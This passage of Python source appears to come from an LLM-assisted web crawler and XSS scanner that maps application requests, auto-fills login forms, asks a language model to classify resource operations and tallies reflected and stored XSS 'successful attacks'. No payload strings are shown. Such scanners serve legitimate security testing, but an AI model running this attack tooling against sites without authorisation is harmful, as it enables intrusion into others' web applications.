        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM ATTACKING GETS"+bcolors.ENDC)
            logging.error("Can't attack gets " + str(e).splitlines()[0])

        try:
            # Quickly check for stored.
            quick_xss = self.quick_check_xss(driver, vectors, start_time)
            successful_xss = successful_xss.union(quick_xss)
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM QUICK CHECK"+bcolors.ENDC)
            logging.error("Can't quick check " + str(e).splitlines()[0])

        print(bcolors.OKGREEN+"----------------------------------"+bcolors.ENDC)
        print(bcolors.OKGREEN+"Successful attacks: "+str(len(successful_xss))+bcolors.ENDC)
        print(bcolors.OKGREEN+"----------------------------------"+bcolors.ENDC)

        app_result_path = os.path.join(RESULT_DIR, self.app_name)
        f = open(os.path.join(app_result_path, "successful_xss_delete.txt"), "w")
        f.write(str(successful_xss))
        f = open(os.path.join(app_result_path, "attack_lookup_table_delete.txt"), "w")
        f.write(str(self.attack_lookup_table))

        print(bcolors.OKGREEN+"ATTACK TABLE\n\n\n\n"+bcolors.ENDC)

        try:
            for (k, v) in self.attack_lookup_table.items():
                if v["reflected"]:
                    print(bcolors.OKGREEN+str(k)+" "+str(v)+bcolors.ENDC)
                    print(bcolors.OKGREEN+"--------------------------------------------"+bcolors.ENDC)
        except Exception as e:
            print(bcolors.OKGREEN+"PROBLEM PRINTING ATTACK TABLE"+bcolors.ENDC)
            logging.error("Can't print attack table " + str(e).splitlines()[0])

    # Quickly check all GET urls for XSS
    # Might be worth extending to full re-crawl
    def quick_check_xss(self, driver, vectors, start_time):

        logging.info("Starting quick scan to find stored XSS")

        successful_xss = set()

        # GET
        for (vector_type, url) in vectors:
            try:
                self.retry_login(driver, self.graph)
                elapsed_time = time.time() - start_time
                if elapsed_time > self.max_reply_time:
                    logging.info("Max reply time reached, stopping")
                    break
                if vector_type == "get":
                    logging.info("-- Checking: " + str(url))
                    if "#" in url:
                        driver.get("http://localhost")
                    driver.get(url)

                    # Inspect
                    successful_xss = successful_xss.union(self.inspect_attack(url))
            except Exception as e:
                logging.error("Can't attack get " + str(e).splitlines()[0])

        logging.info("-- Total: " + str(successful_xss))
        return successful_xss

    def refine(self, analysis):
        if 'resource' in analysis:
            analysis['resource'] = analysis['resource'].lower().replace('-', ' ')

    def receive_analysis(self, graph):
        batch_size = int(os.getenv("MODEL_QPM", 1200))
        while not self.analysis_queue.empty() and batch_size > 0:
            analysis_wrapper = self.analysis_queue.get()
            batch_size -= 1
            req_index = analysis_wrapper['req_index']
            req = graph.nodes[req_index]
            analysis = analysis_wrapper['analysis']
            edge_index = analysis_wrapper['edge_index']
            self.received_requests.add(edge_index)
            print(bcolors.OKGREEN + "Received analysis for edge " + str(edge_index) + " is " + str(analysis) + bcolors.ENDC)
            logging.info("Received analysis for edge " + str(edge_index) + " is " + str(analysis))
            edge = graph.edges[edge_index]
            self.refine(analysis)
            req.value.set_before_resource_operation(analysis)
            edge.value.before_resource_operation = analysis
            if graph.is_blocking(edge):
                graph.add_blocking(edge)
                logging.info("Edge index " + str(edge_index) + " is blocking")
            elif graph.is_unknown_resource(edge):
                logging.info("Edge index " + str(edge_index) + " is unknown resource")
            else:
                if graph.has_successful_edge(edge):
                    print(bcolors.OKGREEN + "Edge index " + str(edge_index) + " already success in graph" + bcolors.ENDC)
                    logging.info("Edge index " + str(edge_index) + " already success in graph")
                    graph.visit_edge(edge)
                else:
                    failed_count = graph.get_failed_count(edge)
                    added = self.dependency_graph.add_node(
                        Node(edge.value.method, analysis.get('resource', "unknown"), analysis.get('CRUD_type', "unknown"),
                             analysis.get('operation', "unknown"), edge_index, failed_count))
                    if not added:
                        graph.visit_edge(edge)
                    print(bcolors.OKGREEN + "Edge index " + str(edge_index) + " not success " + bcolors.ENDC)
                    logging.info("Edge index " + str(edge_index) + " not success")

    def exec_list_to_use(self, list_to_use, driver, graph):
        logging.warning("Trying to exec list_to_use")
        for edge in list_to_use:
            if not edge.visited:
                if not check_edge(driver, graph, edge):
                    logging.warning("Check_edge failed for " + str(edge))
                    graph.visit_edge(edge)
                else:
                    logging.info("Try exec edge "+str(edge.value))
                    successful = follow_edge(driver, graph, edge, True)
                    if successful:
                        print(bcolors.OKGREEN+"Successful exec edge "+str(edge.value)+bcolors.ENDC)
                        logging.info("Successful exec edge "+str(edge.value))
                        return edge
        return None

    def is_similar(self, prompt, threshold=0.95):
        if not self.event_prompt_cache:
            return None

        prompts = self.event_prompt_cache
        vectorizer = TfidfVectorizer().fit_transform([prompt] + prompts)
        similarity_matrix = cosine_similarity(vectorizer[0:1], vectorizer[1:])

        max_sim_idx = similarity_matrix.argmax()
        max_sim_value = similarity_matrix[0, max_sim_idx]

        if max_sim_value >= threshold:
            return True
        return False

    # Handle priority
    async def next_unvisited_edge(self, driver, graph):
        user_url = open("queue.txt", "r").read()
        if user_url:
            print("User supplied url: ", user_url)
            logging.info("Adding user from URLs " + user_url)

            req = Request(user_url, "get")
            current_cookies = driver.get_cookies()
            new_edge, exist = graph.create_edge(self.root_req, req, CrawlEdge(req.method, user_url, None, current_cookies),
                                         graph.data['prev_edge'])
            graph.add(req)
            graph.connect(self.root_req, req, CrawlEdge(req.method, user_url, None, current_cookies), graph.data['prev_edge'])

            print(new_edge)

            open("queue.txt", "w+").write("")
            open("run.flag", "w+").write("3")

            successful = follow_edge(driver, graph, new_edge)
            if successful:
                return new_edge
            else:
                logging.error("Could not load URL from user " + str(new_edge))

        while True:
            self.receive_analysis(graph)

            edge_index = self.scheduler.pick_and_run()

            elapsed_time = time.time() - self.start_time

            if elapsed_time > self.max_crawl_time:
                print(bcolors.OKGREEN + "Max crawl time reached" + bcolors.ENDC)
                logging.info("Max crawl time reached")
                break

            list_to_use = []
            if edge_index >= 0:
                list_to_use.append(graph.edges[edge_index])
            else:
                for edge_index, edge in enumerate(graph.edges):
                    if edge_index not in self.received_requests and not self.analysis_queue.empty():
                        continue
                    if not edge.visited and not edge.value.after_resource_operation and not edge.value.after_context:
                        if not graph.is_blocking(edge):
                            list_to_use.append(edge)

            edge = self.exec_list_to_use(list_to_use, driver, graph)
            if edge:
                return edge

        return None

    async def load_page(self, driver, graph):
        request = None
        edge = await self.next_unvisited_edge(driver, graph)
        if not edge:
            return None

        # Update last visited edge
        graph.data['prev_edge'] = edge

        request = edge.n2.value
        req = request
        new_edge = edge

        current_url = driver.current_url
        if current_url:
            current_url = current_url.rstrip('/')
        if request.url:
            request.url = request.url.rstrip('/')
        if current_url != request.url:
            req = Request(current_url, request.method)
            logging.info("Changed url: " + current_url)
            new_edge, exist = graph.create_edge(edge.n1.value, req, CrawlEdge(edge.value.method, edge.value.method_data, edge.value.before_resource_operation, edge.value.cookies), edge.parent)
            if not exist and allow_edge(graph, new_edge):
                graph.add(req)
                graph.connect(edge.n1.value, req, CrawlEdge(edge.value.method, edge.value.method_data, edge.value.before_resource_operation, edge.value.cookies, edge.value.after_resource_operation), edge.parent)
                logging.info("New Crawl (edge): " + str(new_edge))
                print(bcolors.OKGREEN+"New Crawl (edge): " + str(new_edge)+bcolors.ENDC)
                graph.visit_node(request)
                graph.visit_edge(edge)
            else:
                logging.info("Not allowed to add edge: %s" % new_edge)
                new_edge = edge
                req = request
                graph.visit_node(request)
                graph.visit_edge(edge)
        else:
            logging.info("Current url: " + current_url)
            logging.info("Crawl (edge): " + str(edge))
            print(bcolors.OKGREEN+"Crawl (edge): " + str(edge)+bcolors.ENDC)

        after_prompt = f""""I have used the below prompt to ask you to identify the resource operation before the request action executed. \n {edge.value.before_prompt}\n Your answer is {edge.value.before_resource_operation}\n"""
        after_prompt += f"""Now, I will provide you more details of the request action that is executed.
        Below are the details of the request action that is executed."""
        if edge.value.get_before_context() != edge.value.get_after_context():
            after_prompt += f"""Before the request action is executed, the page state is presented in Markdown format as follows: [{edge.value.get_before_context()}].
            After the request action is executed, the page state is presented in Markdown format as follows: [{edge.value.get_after_context()}].
            """
        else:
            after_prompt += f"""Before the request action is executed, the page state is presented in HTML format as follows: [{edge.value.get_before_page()}].
            After the request action is executed, the page state is presented in HTML format as follows: [{edge.value.get_after_page()}].
            """
        page_state = after_prompt
        request_datas = edge.value.get_request_datas()
        index = 0
        for request_data in request_datas:
            if index == 0:
                after_prompt += "The request action traffics is as follows: \n"
            request_url = request_data['request_url']
            request_headers = request_data['request_headers']
            request_body = request_data['request_body']
            response_status = request_data['response_status']
            response_headers = request_data['response_headers']
            after_prompt += f"""Request {index}: request_url: {request_url}, request_headers: {request_headers},
                        request_body: {request_body}, response_status: {response_status}"""
            if 'response_body' in request_data:
                response_body = request_data['response_body']
                after_prompt += f", response_body: {response_body}"
            after_prompt += "\n"
            index += 1

        MAX_CONTEXT_LENGTH = int(os.getenv("MAX_CONTEXT_LENGTH", 65536))
        length = len(self.tokenizer.encode(after_prompt))
        if length > MAX_CONTEXT_LENGTH:
            logging.warning("Prompt too long: " + str(length) + " " + str(len(after_prompt)))
            after_prompt = after_prompt[:MAX_CONTEXT_LENGTH]

        purpose = os.getenv("PURPOSE", "")
        start = time.time()
        formatted_start = datetime.fromtimestamp(start).strftime('%Y-%m-%d %H:%M:%S')
        print(bcolors.OKGREEN+"start identify_resource_operation_after_request "+str(formatted_start)+bcolors.ENDC)
        resource_operation = self.llm_manager.identify_resource_operation_after_request(purpose, after_prompt, page_state)
        compensation_time = time.time() - start
        average_llm_time = int(os.getenv("AVERAGE_LLM_TIME", 5))
        if compensation_time > average_llm_time:
            self.max_crawl_time += compensation_time-average_llm_time
            self.max_crawl_time = min(self.max_crawl_time, 2 * float(os.getenv("MAX_CRAWL_TIME", 60 * 60 * 3)))
            print(bcolors.OKGREEN+"max_crawl_time "+str(self.max_crawl_time)+" compensation_time "+str(compensation_time)+bcolors.ENDC)
        print(bcolors.OKGREEN+"end identify_resource_operation_after_request "+str(time.time()-start)+bcolors.ENDC)
        edge.value.after_resource_operation = resource_operation
        exec_success = False
        if 'success' in resource_operation:
            print(bcolors.OKGREEN+"Success : "+ str(resource_operation['success'])+" Resource : " + str(resource_operation['resource']) + " Operation : " + str(resource_operation['operation'])+bcolors.ENDC)
            logging.info("Success : "+ str(resource_operation['success'])+" Resource : " + str(resource_operation['resource']) + " Operation : " + str(resource_operation['operation']))
            edge.value.success = resource_operation['success']
            if edge.value.success:
                graph.add_success(edge)
                exec_success = True
            else:
                graph.add_failed(edge)
        else:
            if edge.value.before_resource_operation and edge.value.before_resource_operation != {}:
                before_resource_operation = edge.value.before_resource_operation
                print(bcolors.OKGREEN+"Unsuccessful Before Resource : " + str(before_resource_operation['resource']) + " Operation : " + str(before_resource_operation['operation'])+bcolors.ENDC)
                logging.warning("Unsuccessful Before Resource : " + str(before_resource_operation['resource']) + " Operation : " + str(before_resource_operation['operation']))
            else:
                print(bcolors.OKGREEN+"Unsuccessful"+bcolors.ENDC)
                logging.warning("Unsuccessful")
            edge.value.success = False
            graph.add_failed(edge)
        edge.n2.value.set_after_resource_operation(resource_operation)
        if resource_operation != {}:
            self.scheduler.feedback(Node(edge.value.method, resource_operation.get('resource', "unknown"), resource_operation.get('CRUD_type', "unknown"), resource_operation.get('operation', "unknown"), -1), exec_success)

        return new_edge, req

    # Actually not recursive (TODO change name)
    async def rec_crawl(self):
        driver = self.driver
        graph = self.graph
        llm_manager = self.llm_manager
        tokenizer = self.tokenizer

        todo = await self.load_page(driver, graph)
        if not todo:
            print(bcolors.OKGREEN+"Done crawling"+bcolors.ENDC)
            pprint.pprint(self.io_graph)

            for tracker in self.io_graph:
                if self.io_graph[tracker]['reflected']:
                    print(bcolors.OKGREEN+"EDGE FROM "+str(self.io_graph[tracker]['injected'])+"to"+str(self.io_graph[tracker]['reflected'])+bcolors.ENDC)

            return False

        (edge, request) = todo
        graph.visit_node(request)
        graph.visit_edge(edge)

        # (almost) Never GET twice (optimization)
        if edge.value.method == "get":
            for e in graph.edges:
                if (edge.n2 == e.n2) and (edge != e) and (e.value.method == "get"):
                    #print("Fake visit", e)
                    graph.visit_edge(e)

        # Wait if needed
        try:
            wait_json = driver.execute_script("return JSON.stringify(need_to_wait)")
            wait = json.loads(wait_json)
            if wait:
                time.sleep(1)
        except UnexpectedAlertPresentException:
            logging.warning("Alert detected")
            alert = driver.switch_to.alert
            alert.dismiss()

            # Check if double check is needed...
            try:
                wait_json = driver.execute_script("return JSON.stringify(need_to_wait)")
                wait = json.loads(wait_json)
                if wait:
                    time.sleep(1)
            except Exception as e:
                logging.warning("Inner wait error for need_to_wait " + str(e).splitlines()[0])
        except Exception as e:
            logging.warning("No need_to_wait " + str(e).splitlines()[0])

        # Timeouts
        try:
            resps = driver.execute_script("return JSON.stringify(timeouts)")
            todo = json.loads(resps)
            for t in todo:
                try:
                    if t['function_name']:
                        driver.execute_script(t['function_name'] + "()")
                except Exception as e:
                    logging.warning("Could not execute javascript function in timeout " + str(t) + " " + str(e).splitlines()[0])
        except Exception as e:
            logging.warning("No timeouts from stringify " + str(e).splitlines()[0])

        # Extract urls, forms, elements, iframe etc
        reqs, url_contexts = extract_urls(driver)
        forms, form_contexts = extract_forms(driver)
        for form in forms:
            form_context = form_contexts[form]
            new_forms = set_form_values(driver, [form], llm_manager, tokenizer, False, form_context)
            new_forms_list = list(new_forms)
            if len(new_forms_list) > 0:
                if form == new_forms_list[0]:
                    form_contexts.pop(form)
                form_contexts[new_forms_list[0]] = form_context

        # forms = set_form_values(forms, llm_manager)
        ui_forms, ui_form_contexts = extract_ui_forms(driver)
        events, event_contexts = extract_events(driver)
        iframes, iframe_contexts = extract_iframes(driver)

        # Check if we need to wait for asynch
        try:
            wait_json = driver.execute_script("return JSON.stringify(need_to_wait)")
        except UnexpectedAlertPresentException:
            logging.warning("Alert detected")
            alert = driver.switch_to.alert
            alert.dismiss()
        wait_json = driver.execute_script("return JSON.stringify(need_to_wait)")
        wait = json.loads(wait_json)
        if wait:
            time.sleep(1)

        # Add findings to the graph
        current_cookies = driver.get_cookies() #bear

        logging.info("Adding requests from URLs")

        url_prompt_template = """
        Below is a URL request action that is about to be executed. I will provide relevant information,
        including the DOM structure of the element that triggered the request, the element type, as well as the full URL path and its parameters.
        Here is the data: (1) DOM: {dom_context}; (2) ELEMENT TYPE: {element_type}; (3) URL: {url}.
        """
        for req in url_contexts:
            logging.info("from URLs %s " % str(req))

            new_edge, exist = graph.create_edge(request, req, CrawlEdge(req.method, req.url, None, current_cookies), edge)
            if not exist and allow_edge(graph, new_edge):

                url_context = url_contexts[req]
                dom_context = dom_context_format(url_context['dom_context'], self.tokenizer)
                element_type = json.dumps(url_context['element_type'])
                url = req.url
                url_prompt = url_prompt_template.format(dom_context=dom_context, element_type=element_type, url=url)

                _, req_index = graph.add(req)
                connected = graph.connect(request, req, CrawlEdge(req.method, req.url, None, current_cookies), edge)
                if not connected:
                    logging.warning("Not connected "+str(new_edge))
                    continue
                (new_edge, edge_index) = connected
                new_edge.value.before_prompt = url_prompt
                request_wrapper = {"req_index": req_index, "prompt": url_prompt, "edge_index": edge_index}
                self.request_queue.put(request_wrapper)

            else:
                logging.info("Not allowed to add edge: %s" % new_edge)

        logging.info("Adding requests from forms")

        form_prompt_template = """
        Below is a form request action about to be submitted from a web application. I will provide relevant information,
        including the DOM structure of the form, the form's action URL, and key form fields.

        Here is the data: (1) DOM: {dom_context}; (2) Action URL: {action_url}; (3) Form fields: {form_fileds}.
        """
        for form in form_contexts:
            req = Request(form.action, form.method)
            logging.info("from forms %s " % str(req))

            new_edge, exist = graph.create_edge(request, req, CrawlEdge("form", form, None, current_cookies), edge)
            if not exist and allow_edge(graph, new_edge):

                form_context = form_contexts[form]
                dom_context = dom_context_format(form_context['dom_context'], self.tokenizer)
                action_url = json.dumps(form_context['action_url'])
                form_fields = str(form)
                form_prompt = form_prompt_template.format(dom_context=dom_context, action_url=action_url,
                                                          form_fileds=form_fields)

                _, req_index = graph.add(req)
                connected = graph.connect(request, req, CrawlEdge("form", form, None, current_cookies), edge)
                if not connected:
                    logging.warning("Not connected "+str(new_edge))
                    continue
                (new_edge, edge_index) = connected
                new_edge.value.before_prompt = form_prompt
                request_wrapper = {"req_index": req_index, "prompt": form_prompt, "edge_index": edge_index}
                self.request_queue.put(request_wrapper)

            else:
                logging.info("Not allowed to add edge: %s" % new_edge)

        logging.info("Adding requests from events")

        event_prompt_template = """
        Here is an EVENT request action that is about to be triggered in the web application. I will provide relevant information,
        including the DOM structure related to the event, the JavaScript event handler, and the corresponding action URL for the event.
        The details are as follows: (1) DOM: {dom_context}; (2) JavaScript Event: {js_event}; (3) Action URL: {url}.
        """
        for event in event_contexts:
            req = Request(request.url, "event")
            logging.info("from events %s " % str(req))

            new_edge, exist = graph.create_edge(request, req, CrawlEdge("event", event, None, current_cookies), edge)
            if not exist and allow_edge(graph, new_edge):

                event_context = event_contexts[event]
                dom_context = dom_context_format(event_context['dom_context'], self.tokenizer)
                js_event = json.dumps(event_context['event'])
                url = json.dumps(event_context['url'])
                event_prompt = event_prompt_template.format(dom_context=dom_context, js_event=js_event, url=url)
                event_prompt_hash = hashlib.sha256(event_prompt.encode()).hexdigest()
                if event_prompt_hash in self.event_prompt_hash_cache:
                    logging.warning("Same event prompt")
                    continue
                self.event_prompt_hash_cache.append(event_prompt_hash)
                if self.is_similar(event_prompt, float(os.getenv("EVENT_PROMPT_SIMILARITY_THRESHOLD", 0.95))):
                    logging.warning("Similar event_prompt")
                    continue
                self.event_prompt_cache.append(event_prompt)

                _, req_index = graph.add(req)
                connected = graph.connect(request, req, CrawlEdge("event", event, None, current_cookies), edge)
                if not connected:
                    logging.warning("Not connected "+str(new_edge))
                    continue
                (new_edge, edge_index) = connected
                new_edge.value.before_prompt = event_prompt
                request_wrapper = {"req_index": req_index, "prompt": event_prompt, "edge_index": edge_index, "is_event": True}
                self.request_queue.put(request_wrapper)
            else:
                logging.info("Not allowed to add edge: %s" % new_edge)

        logging.info("Adding requests from iframes")

        iframe_prompt_template = """
        Below is an IFRAME request action embedded in a web application. I will provide relevant information,
        including the IFRAME's attributes, the DOM structure, and the embedded URL.
        Here is the data: (1) IFRAME Attributes: {iframe_content}; (2) DOM: {dom_context}; (3) Embedded URL: {url}.
        """
        for iframe in iframe_contexts:
            req = Request(iframe.src, "iframe")
            logging.info("from iframes %s " % str(req))

            new_edge, exist = graph.create_edge(request, req, CrawlEdge("iframe", iframe, None, current_cookies), edge)
            if not exist and allow_edge(graph, new_edge):

                iframe_context = iframe_contexts[iframe]
                iframe_content = json.dumps(iframe_context['iframe_content'])
                dom_context = dom_context_format(iframe_context['dom_context'], self.tokenizer)
                url = json.dumps(iframe_context['url'])
                iframe_prompt = iframe_prompt_template.format(iframe_content=iframe_content, dom_context=dom_context,
                                                              url=url)
                _, req_index = graph.add(req)
                connected = graph.connect(request, req, CrawlEdge("iframe", iframe, None, current_cookies), edge)
                if not connected:
                    logging.warning("Not connected "+str(new_edge))
                    continue
                (new_edge, edge_index) = connected
                new_edge.value.before_prompt = iframe_prompt
                request_wrapper = {"req_index": req_index, "prompt": iframe_prompt, "edge_index": edge_index}
                self.request_queue.put(request_wrapper)
            else:
                logging.info("Not allowed to add edge: %s" % new_edge)

        logging.info("Adding requests from ui_forms")

        ui_form_prompt_template = """
        Below is a UI_FORM request action about to be triggered in a web application. I will provide relevant information,
        including the DOM structure of the UI_FORM, the JavaScript event handler, the form's action URL, and key interactive elements.
        Here is the data: (1) DOM: {dom_context}; (2) JavaScript Event: {js_event}; (3) Action URL: {action_url};
        (4) Interactive Elements: {interactive_elements}.
        """

        for ui_form in ui_form_contexts:
            req = Request(driver.current_url, "ui_form")
            logging.info("from ui_forms %s " % str(req))

            new_edge, exist = graph.create_edge(request, req, CrawlEdge("ui_form", ui_form, None, current_cookies), edge)
            if not exist and allow_edge(graph, new_edge):

                ui_form_context = ui_form_contexts[ui_form]
                dom_context = dom_context_format(ui_form_context['dom_context'], self.tokenizer)
                js_event = json.dumps(ui_form_context['js_event'])
                action_url = json.dumps(ui_form_context['action_url'])
                interactive_elements = str(ui_form)
                ui_form_prompt = ui_form_prompt_template.format(dom_context=dom_context, js_event=js_event,
                                                                action_url=action_url,
                                                                interactive_elements=interactive_elements)

                _, req_index = graph.add(req)
                connected = graph.connect(request, req, CrawlEdge("ui_form", ui_form, None, current_cookies), edge)
                if not connected:
                    logging.warning("Not connected "+str(new_edge))
                    continue
                (new_edge, edge_index) = connected
                new_edge.value.before_prompt = ui_form_prompt
                request_wrapper = {"req_index": req_index, "prompt": ui_form_prompt, "edge_index": edge_index}
                self.request_queue.put(request_wrapper)
            else:
                logging.info("Not allowed to add edge: %s" % new_edge)

        early_state = self.early_gets < self.max_early_gets
        login_form = find_login_form(driver, graph, early_state)

        if login_form:
            logging.info("Found login form")
            print(bcolors.OKGREEN+"We want to test edge: "+str(edge)+bcolors.ENDC)
            new_form = set_form_values(driver, {login_form}, llm_manager, tokenizer, True).pop()
            try:
                print(bcolors.OKGREEN+"Logging in"+bcolors.ENDC)
                logging.warning("Logging in")
                form_fill(driver, new_form)
                time.sleep(1)

                self.cookies.append(driver.get_cookies())

                current_url = driver.current_url
                if current_url != request.url:
                    new_request = Request(current_url, request.method)
                    logging.info("Changed url: " + current_url)
                    new_edge, exist = graph.create_edge(request, new_request, CrawlEdge("get", current_url, None, None), edge)
                    if not exist and allow_edge(graph, new_edge):
                        graph.add(new_request)
                        graph.connect(request, new_request, CrawlEdge("get", current_url, None, None), edge)
                        logging.info("Crawl (edge): " + str(new_edge))
                        print(bcolors.OKGREEN+"Crawl (edge): " + str(new_edge)+bcolors.ENDC)
                        edge = new_edge
                        request = new_request
                        graph.visit_node(request)
                        graph.visit_edge(edge)
                    else:
                        logging.info("Not allowed to add edge: %s" % new_edge)
            except Exception as e:
                logging.warning("Failed to login to potential login form " + str(e).splitlines()[0])

        # Try to clean up alerts
        try:
            alert = driver.switch_to.alert
            alert.dismiss()
        except NoAlertPresentException:
            pass

        if "3" in open("run.flag", "r").read():
            logging.info("Run set to 3, pause each step")
            input("Crawler in stepping mode, press enter to continue. EDIT run.flag to run")

        # Check command
        found_command = False
        if "get_graph" in open("command.txt", "r").read():
            app_result_path = os.path.join(RESULT_DIR, self.app_name)
            f = open(os.path.join(app_result_path, "graph.txt"), "w+")
            f.write(str(self.graph))
            f.close()
            found_command = True
        # Clear command
        if found_command:
            open("command.txt", "w+").write("")

        return True

    def retry_login(self, driver, graph):
        login_form = find_login_form(driver, graph)

        if login_form:
            logging.info("Found login form")
            new_form = set_form_values(driver, {login_form}, self.llm_manager, self.tokenizer, True).pop()
            try:
                print(bcolors.OKGREEN + "Logging in" + bcolors.ENDC)
                logging.warning("Logging in")
                form_fill(driver, new_form)
                time.sleep(1)
            except Exception as e:
                logging.warning("Failed to login to potential login form " + str(e).splitlines()[0])

# Edge with specific crawling info, cookies, type of request etc.
class CrawlEdge:
    def __init__(self, method, method_data, before_resource_operation, cookies, after_resource_operation=None):
        self.method = method
        self.method_data = method_data
        self.before_resource_operation = before_resource_operation
        self.cookies = cookies
        self.after_resource_operation = after_resource_operation
        self.before_context = None
        self.before_prompt = ""
        self.before_page = None
        self.after_context = None
        self.after_page = None
        self.request_datas = []
        self.success = False

    def get_before_context(self):
        return self.before_context

    def get_after_context(self):
        return self.after_context

    def get_request_datas(self):
        return self.request_datas

    def get_before_page(self):
        return self.before_page

    def get_after_page(self):
        return self.after_page

    def set_before_context(self, before_context):
        self.before_context = before_context

    def set_before_page(self, before_page):
        self.before_page = before_page

    def set_after_page(self, after_page):
        self.after_page = after_page

    def set_after_context(self, after_context):
        self.after_context = after_context

    def set_request_datas(self, request_datas):
        self.request_datas = request_datas

    def __repr__(self):
        str_edge = str(self.method) + " " + str(self.method_data)
        if self.after_resource_operation:
            str_edge += " " + str(self.after_resource_operation)
        elif self.before_resource_operation:
            str_edge += " " + str(self.before_resource_operation)
        return str_edge

    # Cookies are not considered for equality.
    def __eq__(self, other):
        ori_equal = self.method == other.method
        if ori_equal:
            if self.method == "get":
                if are_urls_equivalent(self.method_data, other.method_data):
                    ori_equal = True
                else:
                    ori_equal = False
        ori_equal = ori_equal and self.method_data == other.method_data
        if not ori_equal:
            semantic_equal = False
            method_equal = self.method == other.method
            if other.success:
                if self.before_resource_operation and self.before_resource_operation != {}:
                    if other.after_resource_operation and other.after_resource_operation != {}:
                        semantic_equal = method_equal and compare_resource_operation(self.before_resource_operation, other.after_resource_operation)
            return semantic_equal
        return ori_equal

    def __hash__(self):
        return hash(self.method)

    def dump(self):
        return {
            'method': self.method,
            'method_data': self.method_data,
            'before_resource_operation': self.before_resource_operation,
            'after_resource_operation': self.after_resource_operation,
            'success': self.success,
            'before_context': self.before_context,
            'after_context': self.after_context,
            'before_page': self.before_page,
            'after_page': self.after_page,
            'request_datas': self.request_datas
        }